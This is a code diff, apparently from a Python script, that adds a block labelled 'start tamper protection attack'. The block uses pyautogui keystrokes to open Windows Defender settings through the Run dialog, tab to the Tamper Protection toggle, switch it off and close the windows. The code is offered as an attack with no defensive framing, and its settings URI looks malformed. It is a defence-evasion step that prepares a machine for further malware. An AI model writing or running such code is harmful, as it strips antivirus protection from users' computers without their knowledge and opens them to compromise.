@@ -4,6 +4,37 @@ import subprocess
 import ctypes
 
 
+#start tamper protection attack
+
+
+pyautogui.hotkey('win', 'r') 
+
+payload1= 'mssettings:windowsdefender'
+
+pyautogui.write(payload1, interval=0.005)
+
+pyautogui.press('enter')
+
+pyautogui.press('tab', presses=4, interval=1)  # Navigate to the "Virus & threat protection" section
+pyautogui.press('enter')
+
+# Wait for the settings window to open
+time.sleep(2)
+# Step 5: Disable tamper protection
+pyautogui.press('tab', presses=4, interval=1)  # Navigate to the "Tamper Protection" toggle
+
+pyautogui.press('space')  # Toggle the switch to disable tamper protection
+
+# Wait for the toggle to take effect
+time.sleep(2)
+# Step 6: Close the settings window
+pyautogui.hotkey('alt', 'f4')  # Close the settings window
+
+pyautogui.hotkey('alt', 'f4')  # Close the defender window
+
+
+
+
 
 
 
